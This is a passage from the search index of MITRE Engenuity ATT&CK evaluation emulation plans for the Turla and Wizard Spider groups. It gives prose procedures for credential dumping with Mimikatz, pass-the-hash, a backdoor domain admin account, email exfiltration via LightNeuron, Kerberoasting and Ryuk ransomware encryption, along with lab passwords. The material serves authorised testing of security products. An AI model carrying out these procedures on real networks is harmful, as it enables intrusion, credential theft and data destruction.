next discovery command to enumerate EgleAdmin's groups:","Wait 1 minute then execute the next discovery command to the drive mapped to the file server:","When prompted, type in the password for EgleAdmin:","Within the RDP session, go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","EPIC","Execute commands ExecCmd","File download DownloadFile","Function Hooking","Infinity Hook","Inject Usermodule DLL","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 9: Securelist/Artemon- Uroburos","Report 10: BAE/Artemon- Snake","Report 11: GData- Uroburos","Report 12: CIRCL- TR-25","Report 13: GData- Kernel Protection Mitigation","Report 14: GData- using WinDbg","Report 16: GData- Project Cobra","Report 17: Tetrane- Uroburos with REVEN","Report 18: Talos- Snake Campaign","Report 19: Lastline- Dissecting Turla Rootkit","Report 20: Lastline- Kernel Exploit Makeover","Report 27: GitHub- hfiref0x/TDL","Report 28: CoreLabs- VirtualBox Privilege Escalation","Report 29: Unit42- Acidbox"]},{"i":"test-11-snake-lateral-movement-to-file-server","l":"Test 11: Snake Lateral Movement to File Server","p":["\uD83C\uDFA4 Voice Track:","Test 11 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it, and then using Powershell to perform Active Directory user, group, and computer discovery."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Ensure that Zilvinas' Workstation appears in the Description field for uosis","â Verify that Server Management is included in the results.","â Verify that you see output. If the implant returns empty output, please contact your lead.","â Verify that ZilvinasAdmin shows up in the list of accounts.","â¡ï¸ Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","â¡ï¸ RDP into berzas (10.100.30.204) as EgleAdmin:","â¡ï¸ Return to your Kali C2 server","â¡ï¸ Return to your RDP session to Azuolas (10.100.40.103) as Egle and look for indications of vendor blocking activity.","â¡ï¸ Return to your RDP session to berzas (10.100.30.204) as EgleAdmin","Check both the Egle and EgleAdmin RDP windows for indications of the vendor blocking the activity.","Close any spurious windows","Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).","From your lower Kali C2 control server terminal window, task Snake to check if the ActiveDirectory PowerShell module is installed.","From your smbclient Kali terminal tab, copy PsExec and the second Snake installer to Azuolas.","In the â EgleAdmin Powershell terminal, run the following command to execute PsExec, which will run the Snake installer on the file server berzas:","nk\\EgleAdmin","Open Edge and navigate to https://www.google.com. Perform a search on File server configuration best practices, but don't click on any results.","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer1!","Username","Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word \"management\", as members of these groups will likely have elevated permissions on the network.","Wait 1 minute before tasking Snake to discover domain users. Ensure Zilvinas and ZilvinasAdmin appear in the output.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Domain Admins domain group.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla on users to target next."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Disable DSE and Load Rootkit","Driver","Drop DLL","Function Hooking","Generic process execution with optional token impersonation","Infinity Hook","Inject Usermodule DLL","Payload download","Powershell execution","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution via cmd","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"test-12-credential-dumping-lateral-movement-and-persistence","l":"Test 12: Credential Dumping, Lateral Movement, and Persistence","p":["\uD83C\uDFA4 Voice Track:","Test 12 emulates Turla performing credential dumping on the file server, and then performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that the password and NTLM hash for ZilvinasAdmin appears in the output.","â Verify that we find processes running under ZilvinasAdmin","â¡ï¸ Go back to the RDP session to Berzas (10.100.30.204) as EgleAdmin:","â¡ï¸ Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.","â¡ï¸ Return to your Kali C2 server","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as Zilvinas:","â¡ï¸ Start a new RDP session to uosis (10.100.40.102) as Zilvinas:","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\ZilvinasAdmin:","Check both the berzas (10.100.30.204) and uosis (10.100.40.102) RDP sessions for indicators of blocked activity.","Click on the search bar and search for powershell. Right click powershell and then click \"Run as Administrator\".","From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under ZilvinasAdmin.","From the smbclient Kali terminal tab, copy MimiKatz, PsExec, and the Snake installer, to the file server berzas:","In the admin cmd prompt, run Mimikatz to dump all NTLM hashes from LSASS.exe:","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter* Username : ZilvinasAdmin","nk\\EgleAdmin","nk\\Zilvinas","nk\\ZilvinasAdmin","Open command prompt (cmd) as an administrator. If prompted for credentials, use the following:","Open Edge and navigate to https://drebule.nk.local/owa. Log in as Zilvinas:","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer1!","Producer2!","Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.","The output should contain:","This should return output similar to the following:","Username","Wait 1 minute and then in the same elevated cmd prompt, perform pass-the-hash via MimiKatz using ZilvinasAdmin's NTLM hash to run PsExec and install Snake on the target workstation.","Wait 1 minute, then instruct Snake to add Leshy to the Domain Admins group.","Wait 1 minute, then instruct Snake to create a new domain user Leshy using an access token from one of the ZilvinasAdmin processes. Leshy will be used as a backdoor domain admin account for persistence on the domain.","When prompted, type in the username and password for ZilvinasAdmin:","You may have to go up a few results to find the hash and password"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","File Upload","Function Hooking","Infinity Hook","Inject Usermodule DLL","Mimikatz","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution for generic process","Task execution via cmd with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"test-13-lateral-movement-to-exchange-server-and-lightneuron-capabilities","l":"Test 13: Lateral Movement to Exchange Server and LightNeuron Capabilities","p":["\uD83C\uDFA4 Voice Track:","Test 13 emulates Turla laterally moving to the Exchange server, installing the LightNeuron implant there, and sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â If no response is received after 5 minutes, check the postfix logs on the Kali server to make sure the email was intercepted and processed correctly by LightNeuron.","â If the output contains any errors, notify your lead.","â Verify that the WMIC output shows a ReturnValue of 0.","â¡ï¸ Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:","â¡ï¸ Return to your Kali C2 server","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as Zilvinas","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","â¡ï¸ Return to your RDP session to uosis (10.100.40.102) as ZilvinasAdmin.","â¡ï¸ Start a new RDP session to drebule (10.100.30.203) as ZilvinasAdmin:","â¡ï¸ Switch to your RDP session to drebule (10.100.30.203) to look for any indicators of blocked activity.","â¡ï¸ Switch to your RDP window to Azuolas (10.100.40.103) as Egle.","Check your RDP session to drebule (10.100.30.203) to look for any indicators of blocked activity.","Confirm the presence of an msxfer.dat, this implies the LightNeuron transport agent was successfully installed and intercepted the email containing C2 commands","Create a new email:","From the Kali C2 lower terminal window, task LightNeuron to perform system network configuration discovery:","Go to your Edge browser window with the OWA page. If you do not have an Edge browser with OWA open from a previous step, open Edge then navigate to https://drebule.nk.local/owa and log in as Zilvinas:","Go to your Edge browser window. You should still be logged into OWA from earlier.","If there is a reject entry, that means the email, destined for a nonexistent user, was processed by the Exchange server, meaning that LightNeuron was either not successfully installed or is not working properly.","In the elevated cmd prompt, run the following commands to copy LightNeuron files. After each command, check your RDP session to drebule (10.100.30.203) to look for any indicators of blocked vendor activity.","In your Kali terminal window, copy the LightNeuron files to uosis","nk\\Zilvinas","nk\\ZilvinasAdmin","Open File Explorer and browse to C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer2!","Reply to the email from Zilvinas.","Send the email","Start an elevated command prompt. When prompted for credentials, use:","The email recipient should be the user egle@nk.local","The email subject should be SAP Integration Issue","The file contents will be logged by the control server.â Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:","The following text should be pasted in as the email body:","The following text should be pasted in as the email reply body:","Username","Wait 1 minute and then run the following command in the elevated cmd prompt to check the installation log for any errors:","Wait 1 minute and then run the following command in the elevated cmd prompt to install LightNeuron remotely using WMI and Powershell:","Wait 1 minute before copying the last config file:","Wait 1 minute before copying the next file (installation script):","Wait 1 minute before copying the next file (LightNeuron companion DLL):","Wait 1 minute before copying the rules file:","You should see the email from Zilvinas@nk.local. Try reloading the page if needed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Analyze attachment for data from C2","Automated Collection","Check message against rule file","Check signature in image","Companion DLL","Data Staging/Automated Collection","Decode attachment data from base64","Decrypt data in image","Email Hiding Rules","Encode data in base64","Encrypt result of command in image","Execute commands: Cmd ID 3","Execute commands: Cmd ID 5","Extract task from image","Hide result of command in image","Installation Script","LightNeuron","Masquerading legitimate file name","Remote Email Collection","Send message back to C2 server over email","Steganography","Transport Agent"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]}],[{"l":"Turla Intelligence Summary"},{"i":"attck-group-id-g0010","l":"ATT&CK Group ID: G0010","p":["Active since at least the early 2000s, Turla is a sophisticated Russian-based threat group that has exploited victims in more than 50 countries. 1 The group has targeted government agencies, diplomatic missions, military groups, research and education facilities, critical infrastructure sectors, and media organizations. 1 2 Turla leverages novel techniques and custom tooling and open-source tools to elude defenses and persist on target networks. 3 4 The group is also known for its adaptability and willingness to evolve behaviors and tools to achieve campaign objectives. 5 6 7 Turla is known for their targeted intrusions and innovative stealth. After establishing a foothold and conducting victim enumeration, Turla persists with a minimal footprint through in-memory or kernel implants. 8 9 Turla executes highly targeted campaigns aimed at exfiltrating sensitive information from Linux and Windows infrastructure. 10 11","Associated Groups: IRON HUNTER, Group 88, Belugasturgeon, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear"]},{"l":"Technique Scope"},{"l":"Key Adversary Report References","p":["<https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_ Turla+âPenquin_x64â.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338>","1","10","11","12","13","14","15","16","17","18","19","2","20","21","22","23","24","25","26","27","28","29","3","30","31","4","5","6","7","8","9","https://blog.talosintelligence.com/tinyturla/","https://cert.gov.ua/article/5213167","https://dl.acm.org/doi/pdf/10.1145/3603506","https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_TURLA_20191021%20VER%203%20-%20COPY.PDF","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a","https://www.eset.com/us/about/newsroom/press-releases/cyber-espionage-group-turla-and-its-latest-malware-under-the-microscope-1/","https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.hhs.gov/sites/default/files/major-cyber-orgs-of-russian-intelligence-services.pdf","https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled","https://www.kaspersky.com/about/press-releases/2023_apt-q1-2023-playbook-advanced-techniques-broader-horizons-and-new-targets","https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/","https://www.ncsc.gov.uk/static-assets/documents/Turla%20Neuron%20Malware%20Update.pdf","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf","https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf","Report Links","Source ID"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}],[{"l":"Wizard Spider","p":["License","Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Wizard Spider in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83E\uDE84 \uD83D\uDD78ï¸","p":["Wizard Spider is a Russia-based e-crime group originally known for the Trickbot banking malware. 1 In August 2018, Wizard Spider added capabilities to their Trickbot software enabling the deployment of the Ryuk ransomware. 2 3 This resulted in \"big game hunting\" campaigns, focused on targeting large organizations for high-ransom return rates. 4 Notable Ryuk attacks include the Universal Healthcare System Hospitals, US Georgia and Florida state government administrative offices, and Chinese companies. 5 6","According to the FBI, in less than one year (2019-2020) Wizard Spider extorted $61 million USD from ransomware attacks. 7 8 Throughout the operations, the group used a multi-staged approach to manage ransomware campaigns. 9 Prior to encrypting a victim's network, the group exfiltrates sensitive data and threatens to publicly disclose it if the victim refuses to pay the ransom.","Associated Names: UNC1878, TEMP.MixMaster, Grim Spider, Team9"]},{"l":"Emulation Overview","p":["Software Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1â\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code. Executables are provided in password protected zip files located in the specified software folder. The password is malware.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","We provide a script to automatically decrypt these files:"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"i":"emulation-key-software","l":"Emulation Key Software \uD83D\uDCBB","p":["Emotet","TrickBot","Ryuk"]},{"l":"Scenario Walkthrough","p":["Detection Scenario- Step by Step walkthrough of Scenario's procedures (10 steps).","Protection Scenario- Step by Step walkthrough of Scenario's procedures (6 tests)"]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Operation Flow- High-level summary of the scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","SentinelOne","Trellix/McAfee","Wojciech Lesicki, @WLesicki"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2022 MITRE Engenuity. Approved for Public Release. Document number AT0016.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Scenario Overview","p":["This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).","This scenario emulates Wizard Spider TTPs based on several malware specimens either used by or associated with the Wizard Spider actors:","Emotet","Trickbot","Ryuk"]},{"i":"step-1---initial-compromise","l":"Step 1 - Initial Compromise","p":["\uD83C\uDFA4 Voice Track:","Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.","The word document contains obfuscated VBA macros that downloads and executes a malicious DLL.","The malicious DLL establishes a C2 session with the adversary control server.","The malicious DLL is based on Emotet.","Note: the document is pre-positioned in the environment.","We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Upload the Emotet-dropper document to Dorothy's desktop:","Start the control server from your terminator terminal.","Open a new terminal tab (ctrl-shift-T); double click the terminal tab and rename it to \"RDP to Dorothy\"","RDP into Dorothy / 10.0.0.7 as user Judy:","Open outlook if its not already open, log in to Office account if not already logged in","Open the ChristmasCard.docm document on the desktop; enable macros when prompted.","You should see a terminal flash; wait for it to execute the Emotet DLL.","Go back to your control server tab; you should have a new callback.","Take a screenshot of your new session, and paste in the vendor slack channel.","Source Code - Dropper Word Document","Source Code - Emotet DLL","For testing without MS Office; be aware that this is not identical to the Word document implementation - the process lineage and file paths change significantly with this method.","Open PowerShell and run:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf","https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor","https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html","https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/","https://blog.talosintelligence.com/2019/01/return-of-emotet.html"]},{"i":"step-2---emotet-persistence","l":"Step 2 - Emotet Persistence","p":["\uD83C\uDFA4 Voice Track:","Wizard Spider establishes registry persistence by adding the registry key:","The registry key is written using the RegSetValueExA WinAPI function."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Open a horizontal terminal tab (right-click split horizontally).","Copy/paste the command in your lower terminal tab:","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/","https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor","https://www.us-cert.gov/ncas/alerts/TA18-201A","https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html"]},{"i":"step-3---emotet-host-discovery-and-credential-collection","l":"Step 3 - Emotet Host Discovery and Credential Collection","p":["\uD83C\uDFA4 Voice Track:","Wizard Spider first enumerates local processes using WinAPI functions: CreateToolhelp32Snapshot and Process32First.","Wizard Spider then downloads and loads an Outlook scraper DLL using the LoadLibraryW and GetProcAddress functions.","Lastly, Wizard Spider executes the Outlook-scraper to dump emails and contacts.","One of the emails contains credentials for another user, bill@oz.local, which will be used in the next step.","Download Info:"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Enumerate processes.","Source Code","Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current working directory.","Load Outlook Scraper DLL into emotet's address space via call to LoadLibraryW() and GetProcAddress().","Scrape email content from Outlook inbox via _ popen call to PowerShell.","_popen info, because I've never heard of it either","Scrape email addresses from inbox.","â ï¸ Sign out of RDP session: Right-click Windows icon - Shut down or sign out - Sign out"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://unit42.paloaltonetworks.com/emotet-command-and-control/","https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/","https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/","https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf"]},{"i":"step-4---move-laterally-deploy-trickbot","l":"Step 4 - Move Laterally Deploy TrickBot","p":["\uD83C\uDFA4 Voice Track:","During this step, Wizard Spider uses bill's credentials to RDP into Toto.","Wizard Spider uploads and executes a malicious EXE based on TrickBot.","Trickbot is uploaded to target using an RDP-mounted network share.","Once executed, Trickbot calls back to the C2 server over HTTP."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Change your RDP tab name to \"RDP into Toto\"","RDP into Toto and create RDP drive that has TrickBot folder structure","Open CMD.exe and copy file to bill's AppData\\Roaming","â ï¸ make sure you're in a CMD shell","Kick off exeuction by starting TrickBotClientExe.exe","Switch back to your C2 terminal window.","Take a screenshot of the new Trickbot session, and paste in Slack."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://attack.mitre.org/groups/G0102/","https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"]},{"i":"step-5---trickbot-discovery","l":"Step 5 - TrickBot Discovery","p":["\uD83C\uDFA4 Voice Track:","In step 5 Wizard Spider uses TrickBot to perform detailed system discovery.","You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.exe, and so on.","Trickbot executes commands via the C standard library function, system()."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your C2 server tab, execute the following commands."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf","https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre","https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/","https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware","https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf"]},{"i":"step-6---kerberoast-the-dc","l":"Step 6 - Kerberoast the DC","p":["\uD83C\uDFA4 Voice Track:","In this step Wizard Spider performs Kerberoasting using a public tool, Rubeus.","Through Kerberoasting, Wizard Spider obtains encrypted credentials for the domain admin, vfleming.","Wizard Spider cracks the credentials offline for use in the next step.","Note: offline cracking isn't performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior."]},{"i":"procedures","l":"â£ï¸ Procedures"},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"]},{"i":"step-7---lateral-movement-to-dc","l":"Step 7 - Lateral Movement to DC","p":["\uD83C\uDFA4 Voice Track:","In step 7 Wizard Spider RDP's into the domain controller as user vfleming.","Wizard Spider dowloads a TrickBot variant to the DC using PowerShell's Invoke-WebRequest command.","Wizard Spider then establishes registry persistence to execute Trickbot when vflemming logs in.","Lastly, Wizard Spider enumerates the domain using the adfind utility."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Go back to your Toto RDP session and sign out: Right-click Windows icon - Shut down or sign out - Sign out","Rename your RDP terminal to \"RDP to wizard\"","RDP to wizard / 10.0.0.4.","â ï¸ Open an administrator powershell.","Download a trickbot variant (same binary with a zero appended to the very end)"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html","https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html","https://thedfirreport.com/2020/10/08/ryuks-return/","https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/"]},{"i":"step-8---dump-active-directory-database-ntdsdit","l":"Step 8 - Dump Active Directory Database (ntds.dit)","p":["\uD83C\uDFA4 Voice Track:","During step 8, Wizard Spider creates a volume shadow copy in order to collect the active directory database (ntds.dit).","Wizard Spider uses vssadmin to create the shadow copy.","Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Spawn a CMD shell within your PowerShell window:","You will get output resembling the following:","â ï¸ Make sure the \\\\\\\\?\\GLOBALROOT...HarddiskVolumeShadowCopy1 path matches your output!","Notionally, Wizard Spider carves credentials offline from ntds.dit using tools like Impacket's secretsdump.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"]},{"i":"step-9---ryuk-inhibit-system-recovery","l":"Step 9 - Ryuk Inhibit System Recovery","p":["\uD83C\uDFA4 Voice Track:","In step 9, Wizard Spider prepares to deploy an executable based on the Ryuk ransomware.","At the beginning of this step, Wizard Spider mounts the C$ share of a lateral host, toto / 10.0.0.8.","Files on Toto will be encrypted in the next step.","Next, Wizard Spider uploads two files to disk: kill.bat and window.bat.","These files are used to stop specific services and delete backups prior to encrypting the system."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Mount share so Ryuk can encrypt lateral drives:","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf"]},{"i":"step-10---ryuk-encryption-for-impact","l":"Step 10 - Ryuk Encryption for Impact","p":["\uD83C\uDFA4 Voice Track:","In our final step, Wizard Spider uploads and executes Ryuk.","Ryuk is uploaded using the RDP-mounted network share, and executed from CMD.","When Ryuk executes, it will first gain SeDebugPrivilege.","Ryuk will then and inject its own executable into a remote process,notepad.exe, via WriteProcessMemory and CreateRemoteThread WinAPI calls.","From the remote process, Ryuk will encrypt files on wizard/10.0.0.4's C:\\Users\\Public directory (recursive).","Next, Ryuk encrypts files on Toto/10.0.0.8 at \\C$\\Users\\Public (mounted on wizard as Z:).","Ryuk uses a symmetric key algorithm, AES256 to encrypt files.","Note that the symmetric key is itself encrypted with RSA2048.","Note: early versions of our Ryuk emulation encrypted the entire filesystem; however, this proces took hours, rather than minutes, so we scaled it back due to time constraints."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["To confirm that encryption worked, execute the following in CMD:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by Wizard Spider. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating Wizard Spider to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\" We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: tested and executed on Kali Linux 2019.1","PAExec","pyyaml","Rubeus","Mimikatz","FreeRDP"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of Ryuk ransomeware.","These utilities include credential dumpers, variants of process injection techniques, and file encryption.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4."]},{"l":"Linux Attack Platform Setup","p":["Download the wizard_spider repository to the home directory"]},{"l":"Target Infrastructure","p":["3 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763.","User machine 1: tested and executed on Windows 10 - Build 19042.","User machine 2: tested and executed on Windows 10 - Build 19042."]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","Domain Controller","wizard","10.0.0.4","User machine 1","dorothy","10.0.0.7","User machine 2","Toto","10.0.0.8"]},{"l":"Domain Controller Setup","p":["RDP into domain controller","xfreerdp +clipboard 